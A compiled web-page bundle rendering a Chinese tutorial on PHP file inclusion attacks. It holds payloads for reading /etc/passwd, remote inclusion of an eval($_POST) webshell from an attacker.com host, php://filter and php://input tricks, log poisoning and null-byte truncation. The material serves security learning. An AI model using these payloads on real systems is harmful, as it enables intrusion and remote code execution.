{"code":"(window.webpackJsonp=window.webpackJsonp||[]).push([[33],{785:function(s,a,t){\"use strict\";t.r(a);var e=t(1),r=Object(e.a)({},(function(){var s=this,a=s.$createElement,t=s._self._c||a;return t(\"ContentSlotsDistributor\",{attrs:{\"slot-key\":s.$parent.slotKey}},[t(\"h2\",{attrs:{id:\"典型特征\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#典型特征\"}},[s._v(\"#\")]),s._v(\" 典型特征\")]),s._v(\" \"),t(\"div\",{staticClass:\"language-URL line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-url\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token query\"}},[t(\"span\",{pre:!0,attrs:{class:\"token query-delimiter\"}},[s._v(\"?\")]),t(\"span\",{pre:!0,attrs:{class:\"token pair\"}},[t(\"span\",{pre:!0,attrs:{class:\"token key\"}},[s._v(\"page\")]),s._v(\"=\"),t(\"span\",{pre:!0,attrs:{class:\"token value\"}},[s._v(\"a.php\")])])]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token query\"}},[t(\"span\",{pre:!0,attrs:{class:\"token query-delimiter\"}},[s._v(\"?\")]),t(\"span\",{pre:!0,attrs:{class:\"token pair\"}},[t(\"span\",{pre:!0,attrs:{class:\"token key\"}},[s._v(\"home\")]),s._v(\"=\"),t(\"span\",{pre:!0,attrs:{class:\"token value\"}},[s._v(\"b.html\")])])]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token query\"}},[t(\"span\",{pre:!0,attrs:{class:\"token query-delimiter\"}},[s._v(\"?\")]),t(\"span\",{pre:!0,attrs:{class:\"token pair\"}},[t(\"span\",{pre:!0,attrs:{class:\"token key\"}},[s._v(\"file\")]),s._v(\"=\"),t(\"span\",{pre:!0,attrs:{class:\"token value\"}},[s._v(\"content\")])])]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token query\"}},[t(\"span\",{pre:!0,attrs:{class:\"token query-delimiter\"}},[s._v(\"?\")]),t(\"span\",{pre:!0,attrs:{class:\"token pair\"}},[t(\"span\",{pre:!0,attrs:{class:\"token key\"}},[s._v(\"name\")]),s._v(\"=\"),t(\"span\",{pre:!0,attrs:{class:\"token value\"}},[s._v(\"a.php\")])])]),s._v(\"\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\")])]),t(\"h2\",{attrs:{id:\"php常见导致文件包含的函数\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#php常见导致文件包含的函数\"}},[s._v(\"#\")]),s._v(\" php常见导致文件包含的函数：\")]),s._v(\" \"),t(\"div\",{staticClass:\"language-php line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-php\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token keyword\"}},[s._v(\"include\")]),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"(\")]),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\")\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token keyword\"}},[s._v(\"include_once\")]),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"(\")]),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\")\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token keyword\"}},[s._v(\"require\")]),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"(\")]),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\")\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token keyword\"}},[s._v(\"require_once\")]),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"(\")]),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\")\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"fopen\")]),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"(\")]),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\")\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"readfile\")]),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"(\")]),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\")\")]),s._v(\"\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\")])]),t(\"h2\",{attrs:{id:\"利用\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#利用\"}},[s._v(\"#\")]),s._v(\" 利用\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"读取文件\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-url line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-url\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token scheme\"}},[s._v(\"http\"),t(\"span\",{pre:!0,attrs:{class:\"token scheme-delimiter\"}},[s._v(\":\")])]),t(\"span\",{pre:!0,attrs:{class:\"token authority\"}},[t(\"span\",{pre:!0,attrs:{class:\"token authority-delimiter\"}},[s._v(\"//\")]),t(\"span\",{pre:!0,attrs:{class:\"token host\"}},[s._v(\"www.xxser.com\")])]),t(\"span\",{pre:!0,attrs:{class:\"token path\"}},[t(\"span\",{pre:!0,attrs:{class:\"token path-separator\"}},[s._v(\"/\")]),s._v(\"index.php\")]),t(\"span\",{pre:!0,attrs:{class:\"token query\"}},[t(\"span\",{pre:!0,attrs:{class:\"token query-delimiter\"}},[s._v(\"?\")]),t(\"span\",{pre:!0,attrs:{class:\"token pair\"}},[t(\"span\",{pre:!0,attrs:{class:\"token key\"}},[s._v(\"page\")]),s._v(\"=\"),t(\"span\",{pre:!0,attrs:{class:\"token value\"}},[s._v(\"/etc/passwd\")])])]),s._v(\"\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\")])]),t(\"ol\",{attrs:{start:\"2\"}},[t(\"li\",[s._v(\"远程包含shell\"),t(\"br\"),s._v(\"\\nallow_url_fopen=on 情况下\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-url line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-url\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token scheme\"}},[s._v(\"http\"),t(\"span\",{pre:!0,attrs:{class:\"token scheme-delimiter\"}},[s._v(\":\")])]),t(\"span\",{pre:!0,attrs:{class:\"token authority\"}},[t(\"span\",{pre:!0,attrs:{class:\"token authority-delimiter\"}},[s._v(\"//\")]),t(\"span\",{pre:!0,attrs:{class:\"token host\"}},[s._v(\"www.example.com\")])]),t(\"span\",{pre:!0,attrs:{class:\"token path\"}},[t(\"span\",{pre:!0,attrs:{class:\"token path-separator\"}},[s._v(\"/\")]),s._v(\"index.php\")]),t(\"span\",{pre:!0,attrs:{class:\"token query\"}},[t(\"span\",{pre:!0,attrs:{class:\"token query-delimiter\"}},[s._v(\"?\")]),t(\"span\",{pre:!0,attrs:{class:\"token pair\"}},[t(\"span\",{pre:!0,attrs:{class:\"token key\"}},[s._v(\"page\")]),s._v(\"=\"),t(\"span\",{pre:!0,attrs:{class:\"token value\"}},[s._v(\"http://www.attacker.com/echo.txt\")])])]),s._v(\"\\n其中echo.txt内容为:<\"),t(\"span\",{pre:!0,attrs:{class:\"token query\"}},[t(\"span\",{pre:!0,attrs:{class:\"token query-delimiter\"}},[s._v(\"?\")]),t(\"span\",{pre:!0,attrs:{class:\"token pair\"}},[t(\"span\",{pre:!0,attrs:{class:\"token key\"}},[s._v(\"php\")])])]),s._v(\" eval($_POST[xxser]);\"),t(\"span\",{pre:!0,attrs:{class:\"token query\"}},[t(\"span\",{pre:!0,attrs:{class:\"token query-delimiter\"}},[s._v(\"?\")])]),s._v(\">\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\")])]),t(\"ol\",{attrs:{start:\"3\"}},[t(\"li\",[s._v(\"本地包含配合文件上传漏洞包含shell\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-url line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-url\"}},[t(\"code\",[s._v(\"上传一句话木马文件后，通过文件包含利用，非php扩展文件被包含后也会被当作php解析\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token scheme\"}},[s._v(\"http\"),t(\"span\",{pre:!0,attrs:{class:\"token scheme-delimiter\"}},[s._v(\":\")])]),t(\"span\",{pre:!0,attrs:{class:\"token authority\"}},[t(\"span\",{pre:!0,attrs:{class:\"token authority-delimiter\"}},[s._v(\"//\")]),t(\"span\",{pre:!0,attrs:{class:\"token host\"}},[s._v(\"www.example.com\")])]),t(\"span\",{pre:!0,attrs:{class:\"token path\"}},[t(\"span\",{pre:!0,attrs:{class:\"token path-separator\"}},[s._v(\"/\")]),s._v(\"index.php\")]),t(\"span\",{pre:!0,attrs:{class:\"token query\"}},[t(\"span\",{pre:!0,attrs:{class:\"token query-delimiter\"}},[s._v(\"?\")]),t(\"span\",{pre:!0,attrs:{class:\"token pair\"}},[t(\"span\",{pre:!0,attrs:{class:\"token key\"}},[s._v(\"page\")]),s._v(\"=\"),t(\"span\",{pre:!0,attrs:{class:\"token value\"}},[s._v(\"./uploadfile/xxx.jpg\")])])]),s._v(\"\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\")])]),t(\"ol\",{attrs:{start:\"4\"}},[t(\"li\",[s._v(\"PHP协议\")])]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"php://filter\"),t(\"br\"),s._v(\"\\n一种元封装器，用于数据流打开时的筛选过滤应用\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-url line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-url\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token scheme\"}},[s._v(\"http\"),t(\"span\",{pre:!0,attrs:{class:\"token scheme-delimiter\"}},[s._v(\":\")])]),t(\"span\",{pre:!0,attrs:{class:\"token authority\"}},[t(\"span\",{pre:!0,attrs:{class:\"token authority-delimiter\"}},[s._v(\"//\")]),t(\"span\",{pre:!0,attrs:{class:\"token host\"}},[s._v(\"www.example.com\")])]),t(\"span\",{pre:!0,attrs:{class:\"token path\"}},[t(\"span\",{pre:!0,attrs:{class:\"token path-separator\"}},[s._v(\"/\")]),s._v(\"index.php\")]),t(\"span\",{pre:!0,attrs:{class:\"token query\"}},[t(\"span\",{pre:!0,attrs:{class:\"token query-delimiter\"}},[s._v(\"?\")]),t(\"span\",{pre:!0,attrs:{class:\"token pair\"}},[t(\"span\",{pre:!0,attrs:{class:\"token key\"}},[s._v(\"page\")]),s._v(\"=\"),t(\"span\",{pre:!0,attrs:{class:\"token value\"}},[s._v(\"php://filter/read=convert.base64-encode/resource=config.php\")])])]),s._v(\"\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\")])]),t(\"ul\",[t(\"li\",[s._v(\"php://input\"),t(\"br\"),s._v(\"\\nphp://input是个可以访问请求的原始数据的只读流,可以接收post请求，将请求作为PHP代码的输入传递给目标变量\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-url line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-url\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token scheme\"}},[s._v(\"http\"),t(\"span\",{pre:!0,attrs:{class:\"token scheme-delimiter\"}},[s._v(\":\")])]),t(\"span\",{pre:!0,attrs:{class:\"token authority\"}},[t(\"span\",{pre:!0,attrs:{class:\"token authority-delimiter\"}},[s._v(\"//\")]),t(\"span\",{pre:!0,attrs:{class:\"token host\"}},[s._v(\"www.example.com\")])]),t(\"span\",{pre:!0,attrs:{class:\"token path\"}},[t(\"span\",{pre:!0,attrs:{class:\"token path-separator\"}},[s._v(\"/\")]),s._v(\"index.php\")]),t(\"span\",{pre:!0,attrs:{class:\"token query\"}},[t(\"span\",{pre:!0,attrs:{class:\"token query-delimiter\"}},[s._v(\"?\")]),t(\"span\",{pre:!0,attrs:{class:\"token pair\"}},[t(\"span\",{pre:!0,attrs:{class:\"token key\"}},[s._v(\"page\")]),s._v(\"=\"),t(\"span\",{pre:!0,attrs:{class:\"token value\"}},[s._v(\"php://input\")])])]),s._v(\"\\n实例：\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token path\"}},[s._v(\"POST\")]),s._v(\" /\"),t(\"span\",{pre:!0,attrs:{class:\"token query\"}},[t(\"span\",{pre:!0,attrs:{class:\"token query-delimiter\"}},[s._v(\"?\")]),t(\"span\",{pre:!0,attrs:{class:\"token pair\"}},[t(\"span\",{pre:!0,attrs:{class:\"token key\"}},[s._v(\"file\")]),s._v(\"=\"),t(\"span\",{pre:!0,attrs:{class:\"token value\"}},[s._v(\"php://input\")])])]),s._v(\"\\n<\"),t(\"span\",{pre:!0,attrs:{class:\"token query\"}},[t(\"span\",{pre:!0,attrs:{class:\"token query-delimiter\"}},[s._v(\"?\")]),t(\"span\",{pre:!0,attrs:{class:\"token pair\"}},[t(\"span\",{pre:!0,attrs:{class:\"token key\"}},[s._v(\"php\")])])]),s._v(' system(\"cat /flag\");'),t(\"span\",{pre:!0,attrs:{class:\"token query\"}},[t(\"span\",{pre:!0,attrs:{class:\"token query-delimiter\"}},[s._v(\"?\")])]),s._v(\">\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\")])]),t(\"ol\",{attrs:{start:\"5\"}},[t(\"li\",[s._v(\"包含日志文件\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-url line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-url\"}},[t(\"code\",[s._v(\"先访问：http://www.example.com/<\"),t(\"span\",{pre:!0,attrs:{class:\"token query\"}},[t(\"span\",{pre:!0,attrs:{class:\"token query-delimiter\"}},[s._v(\"?\")]),t(\"span\",{pre:!0,attrs:{class:\"token pair\"}},[t(\"span\",{pre:!0,attrs:{class:\"token key\"}},[s._v(\"php\")])])]),s._v(\" phpinfo();\"),t(\"span\",{pre:!0,attrs:{class:\"token query\"}},[t(\"span\",{pre:!0,attrs:{class:\"token query-delimiter\"}},[s._v(\"?\")])]),s._v(\">生成日志\\n再访问：http://www.xxser.com/index.php\"),t(\"span\",{pre:!0,attrs:{class:\"token query\"}},[t(\"span\",{pre:!0,attrs:{class:\"token query-delimiter\"}},[s._v(\"?\")]),t(\"span\",{pre:!0,attrs:{class:\"token pair\"}},[t(\"span\",{pre:!0,attrs:{class:\"token key\"}},[s._v(\"page\")]),s._v(\"=\"),t(\"span\",{pre:!0,attrs:{class:\"token value\"}},[s._v(\"./../Apache-20/logs/access.log\")])])]),s._v(\"\\n关键在于确定apache路径\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\")])]),t(\"ol\",{attrs:{start:\"6\"}},[t(\"li\",[s._v(\"截断包含\"),t(\"br\"),s._v(\"\\nmagic_quotes_gpc=off 情况下\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-url line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-url\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token scheme\"}},[s._v(\"http\"),t(\"span\",{pre:!0,attrs:{class:\"token scheme-delimiter\"}},[s._v(\":\")])]),t(\"span\",{pre:!0,attrs:{class:\"token authority\"}},[t(\"span\",{pre:!0,attrs:{class:\"token authority-delimiter\"}},[s._v(\"//\")]),t(\"span\",{pre:!0,attrs:{class:\"token host\"}},[s._v(\"www.example.com\")])]),t(\"span\",{pre:!0,attrs:{class:\"token path\"}},[t(\"span\",{pre:!0,attrs:{class:\"token path-separator\"}},[s._v(\"/\")]),s._v(\"index.php\")]),t(\"span\",{pre:!0,attrs:{class:\"token query\"}},[t(\"span\",{pre:!0,attrs:{class:\"token query-delimiter\"}},[s._v(\"?\")]),t(\"span\",{pre:!0,attrs:{class:\"token pair\"}},[t(\"span\",{pre:!0,attrs:{class:\"token key\"}},[s._v(\"page\")]),s._v(\"=\"),t(\"span\",{pre:!0,attrs:{class:\"token value\"}},[s._v(\"1.jpg%00\")])])]),s._v(\"\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\")])])])}),[],!1,null,null,null);a.default=r.exports}}]);","extractedComments":[]}